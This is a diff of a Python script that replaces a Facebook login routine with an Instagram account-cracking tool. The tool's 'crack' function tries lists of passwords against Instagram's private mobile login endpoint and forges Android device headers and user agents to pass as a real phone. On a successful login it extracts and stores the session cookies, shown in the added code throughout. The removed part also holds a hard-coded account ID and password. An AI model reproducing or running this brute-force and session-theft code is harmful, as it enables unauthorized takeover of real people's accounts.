@@ -1,101 +1,248 @@
 import requests
-import base64
-import struct
-import io
+import uuid
 import time
-import json
+import sys
+import random
 import re
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import AES, PKCS1_v1_5
-from Crypto.Random import get_random_bytes
+import base64
+import urllib.parse
+import json
+import hashlib
+from datetime import datetime
+from time import timezone
+import os
 
-def PWD_FB4A(password, public_key=None, key_id="25"):
-    if public_key is None:
-        resp = requests.post(
-            "https://b-graph.facebook.com/pwd_key_fetch",
-            params={
-                "version": "2",
-                "flow": "CONTROLLER_INITIALIZATION",
-                "method": "GET",
-                "fb_api_req_friendly_name": "pwdKeyFetch",
-                "fb_api_caller_class": "com.facebook.auth.login.AuthOperations",
-                "access_token": "438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28",
-            },
-        ).json()
-        public_key = resp.get("public_key")
-        key_id = str(resp.get("key_id", key_id))
+# ==================== UTILITY FUNCTIONS ====================
 
-    rand_key = get_random_bytes(32)
-    iv = get_random_bytes(12)
-    pubkey = RSA.import_key(public_key)
-    cipher_rsa = PKCS1_v1_5.new(pubkey)
-    encrypted_rand_key = cipher_rsa.encrypt(rand_key)
-    cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
-    current_time = int(time.time())
-    cipher_aes.update(str(current_time).encode("utf-8"))
-    encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
+def Blok_ID():
+    """Generate Instagram Bloks Version ID"""
+    try:
+        session = requests.Session()
+        session.headers.update({
+            'user-agent': 'Instagram 312.1.0.34.111 Android (30/11; 320dpi; 720x1472; INFINIX MOBILITY LIMITED/Infinix; Infinix X688B; Infinix-X688B; mt6765; en_US; 548323754)'
+        })
+        response = session.get('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/')
+        blok_version = re.search(r'bloks_version["\']?\s*:\s*["\']?([a-f0-9]+)', response.text)
+        if blok_version:
+            return blok_version.group(1)
+    except:
+        pass
+    # Fallback to a default/random version ID
+    return str(uuid.uuid4()).replace('-', '')[:32]
 
-    buf = io.BytesIO()
-    buf.write(bytes([1, int(key_id)]))
-    buf.write(iv)
-    buf.write(struct.pack("<h", len(encrypted_rand_key)))
-    buf.write(encrypted_rand_key)
-    buf.write(auth_tag)
-    buf.write(encrypted_passwd)
-    encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
+def timezone_offset():
+    """Get current timezone offset in seconds"""
+    try:
+        return -time.timezone if time.daylight == 0 else -time.altzone
+    except:
+        return 0
 
-    return f"#PWD_FB4A:2:{current_time}:{encoded}"
+def SetMid():
+    """Generate Instagram Mid (Machine ID)"""
+    return str(uuid.uuid4()).replace('-', '')
 
-def facebook_login(uid, password):
-    session = requests.Session()
+def Android_ID(users, pwb):
+    """Generate Android Device ID"""
+    try:
+        # Create hash from username and password
+        combined = f"{users}{pwb}".encode('utf-8')
+        return hashlib.md5(combined)
+    except:
+        return hashlib.md5(str(uuid.uuid4()).encode())
 
-    headers = {
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'Origin': 'https://www.facebook.com',
-    'Referer': 'https://www.facebook.com/?stype=lo&flo=1&deoia=1&jlou=Afi33CVi9aSFnvUb391F5-qlmBdkDydfWor_r096lWwevRPeU25CXbhD3Lu2vAKsAmolO1g11BrRAPV91IVkN8RM2lH1tSLE5rEyJ4LRALngow&smuh=25331&lh=Ac_MV4aD9PHN0himQIs',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-    'dpr': '1',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
-    'sec-ch-ua-full-version-list': '"Google Chrome";v="141.0.7390.108", "Not?A_Brand";v="8.0.0.0", "Chromium";v="141.0.7390.108"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
-    'viewport-width': '862',
-}
-
-    # Fetch login page to get hidden tokens
-    login_page = session.get("https://touch.facebook.com/login.php", headers=headers)
-    lsd = re.search(r'name="lsd" value="(.*?)"', login_page.text)
-    jazoest = re.search(r'name="jazoest" value="(.*?)"', login_page.text)
-    if not (lsd and jazoest):
-        print("✗ Could not extract login tokens.")
-        return None
-
-    encpass = PWD_FB4A(password)
-
-    data = {
-        'lsd': lsd.group(1),
-        'jazoest': jazoest.group(1),
-        'email': uid,
-        'encpass': encpass,
-        'login_source': 'login_bluebar',
+def HeadersApiLogin():
+    """Get default API login headers"""
+    return {
+        'x-bloks-version-id': Blok_ID(),
+        'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
+        'x-ig-app-id': '3419628305025917',
+        'x-ig-device-id': str(uuid.uuid4()),
+        'x-ig-family-device-id': str(uuid.uuid4()),
+        'x-ig-android-id': f'android-{str(uuid.uuid4())[:16]}'
     }
 
-    resp = session.post("https://www.facebook.com/login/device-based/regular/login/",
-                        headers=headers, data=data, allow_redirects=True)
+def AppUac(blok_version):
+    """Generate Instagram User-Agent string"""
+    ua_strings = [
+        'Instagram 312.1.0.34.111 Android (30/11; 320dpi; 720x1472; INFINIX MOBILITY LIMITED/Infinix; Infinix X688B; Infinix-X688B; mt6765; en_US; 548323754)',
+        'Instagram 311.0.0.21.112 Android (11; 440dpi; 1080x2340; samsung/SM-G960F; SM-G960F; SM-G960F; exynos9810; en_US; 515395476)',
+        'Instagram 310.0.0.18.110 Android (10; 420dpi; 1080x2220; motorola/moto g8 play; moto g8 play; moto g8 play; sdm665; en_US; 497606881)',
+    ]
+    return random.choice(ua_strings)
 
-    if "c_user" in session.cookies:
-        print("✓ Login successful!")
-        return session.cookies.get_dict()
-    else:
-        print("✗ Login failed!")
-        print("Page title:", re.search(r"<title>(.*?)</title>", resp.text))
-        return None
+def Generate_Device_ID():
+    """Generate a complete device ID"""
+    return f'android-{hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]}'
+
+def Get_Timezone_Offset():
+    """Get timezone offset string"""
+    offset = timezone_offset()
+    hours = abs(offset) // 3600
+    sign = '+' if offset >= 0 else '-'
+    return f"{sign}{hours:02d}:00"
+
+def Generate_Session_Headers():
+    """Generate complete session headers for Instagram API"""
+    device_id = str(uuid.uuid4())
+    family_device_id = str(uuid.uuid4())
+    
+    return {
+        'host': 'b.i.instagram.com',
+        'x-ig-app-locale': 'in_ID',
+        'x-ig-device-locale': 'in_ID',
+        'x-ig-mapped-locale': 'id_ID',
+        'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
+        'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
+        'x-ig-bandwidth-speed-kbps': str(random.randint(100, 300)),
+        'x-ig-bandwidth-totalbytes-b': str(random.randint(500000, 900000)),
+        'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 9000)),
+        'x-bloks-version-id': Blok_ID(),
+        'x-bloks-is-prism-enabled': 'false',
+        'x-bloks-is-layout-rtl': 'false',
+        'x-ig-device-id': device_id,
+        'x-ig-family-device-id': family_device_id,
+        'x-ig-android-id': Generate_Device_ID(),
+        'x-ig-timezone-offset': str(Get_Timezone_Offset()),
+        'x-fb-connection-type': 'MOBILE.LTE',
+        'x-ig-connection-type': 'MOBILE(LTE)',
+        'x-ig-capabilities': '3brTv10=',
+        'x-ig-app-id': '3419628305025917',
+        'priority': 'u=3',
+        'user-agent': AppUac(Blok_ID()),
+        'accept-language': 'id-ID, en-US',
+        'x-mid': SetMid(),
+        'ig-intended-user-id': '0',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'x-fb-http-engine': 'Liger',
+        'x-fb-client-ip': 'True',
+        'x-fb-server-cluster': 'True'
+    }
+
+def Generate_Login_Payload(uid, pw, session_headers):
+    """Generate Instagram login payload"""
+    current_time = int(time.time())
+    
+    payload = {
+        "client_input_params": {
+            "contact_point": uid,
+            "password": f"#PWD_INSTAGRAM:0:{current_time}:{pw}",
+            "event_flow": "account_recovery",
+            "family_device_id": session_headers['x-ig-family-device-id'],
+            "machine_id": session_headers['x-mid'],
+            "accounts_list": [],
+            "has_whatsapp_installed": 0,
+            "login_attempt_count": 1,
+            "device_id": session_headers['x-ig-android-id'],
+            "headers_infra_flow_id": "",
+            "auth_secure_device_id": "",
+            "encrypted_msisdn": "",
+            "device_emails": [],
+            "lois_settings": {
+                "lara_override": "",
+                "lois_token": ""
+            },
+            "event_step": "AYMH_PASSWORD_FORM",
+            "secure_family_device_id": ""
+        },
+        "server_params": {
+            "is_caa_perf_enabled": 0,
+            "is_platform_login": 0,
+            "is_from_logged_out": 0,
+            "login_credential_type": "none",
+            "should_trigger_override_login_2fa_action": 0,
+            "is_from_logged_in_switcher": 0,
+            "family_device_id": session_headers['x-ig-family-device-id'],
+            "credential_type": "password",
+            "waterfall_id": str(uuid.uuid4()),
+            "password_text_input_id": "4kv99g:38",
+            "layered_homepage_experiment_group": None,
+            "offline_experiment_group": None,
+            "INTERNAL_INFRA_THEME": "harm_f",
+            "INTERNAL__latency_qpl_instance_id": 27691536400061,
+            "device_id": session_headers['x-ig-android-id'],
+            "server_login_source": "device_based_login",
+            "login_source": "AccountRecovery",
+            "caller": "gslr",
+            "should_trigger_override_login_success_action": 0,
+            "ar_event_source": "first_password_failure",
+            "INTERNAL__latency_qpl_marker_id": 36707139
+        }
+    }
+    return json.dumps(payload)
+
+# ==================== UPDATED CRACK FUNCTION ====================
+
+def crack(uid, pww, total_idz):
+    global loop
+    global oks
+    global cps
+    
+    x = random.choice(["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"])
+    sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
+    sys.stdout.flush()
+    
+    try:
+        for pw in pww:
+            session = requests.Session()
+            headers = Generate_Session_Headers()
+            session.headers.update(headers)
+            
+            payload_json = Generate_Login_Payload(uid, pw, headers)
+            
+            query_data = {
+                'params': payload_json,
+                'bk_client_context': json.dumps({"bloks_version": headers['x-bloks-version-id'], "styles_id": "instagram"}),
+                'bloks_versioning_id': headers['x-bloks-version-id']
+            }
+            
+            Query = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s' % (
+                urllib.parse.quote(query_data['params']),
+                urllib.parse.quote(query_data['bk_client_context']),
+                query_data['bloks_versioning_id']
+            )
+            
+            try:
+                Response = requests.post(
+                    'https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',
+                    data=Query,
+                    allow_redirects=True,
+                    timeout=10
+                )
+                
+                if 'logged_in_user' in Response.text.replace('\\', ''):
+                    try:
+                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(Response.text.replace('\\', ''))).group(1)
+                        xyz = base64.b64decode(cok.split(':')[2]).decode()
+                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
+                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
+                        cokie = {"ds_user_id": f"{ds_id}", "sessionid": f"{sn_id}"}
+                        print(f"\n✓ SUCCESS: {cokie}")
+                        oks.append(cokie)
+                        break
+                    except Exception as e:
+                        print(f"\n✗ Parse Error: {e}")
+                        continue
+                else:
+                    cps.append(uid)
+                    
+            except requests.exceptions.RequestException as e:
+                print(f"\n✗ Request Error: {e}")
+                continue
+                
+    except Exception as e:
+        print(f"\n✗ Critical Error in crack function: {e}")
+
+# ==================== EXAMPLE USAGE ====================
 
 if __name__ == "__main__":
-    uid = "6301109484"
-    password = "630110"
-    facebook_login(uid, password)
+    # Initialize global variables
+    loop = 0
+    oks = []
+    cps = []
+    
+    # Example usage
+    uid = "username@example.com"  # Username or email
+    pww = ["password1", "password2", "password3"]  # List of passwords to try
+    total_idz = len(pww)
+    
+    crack(uid, pww, total_idz)
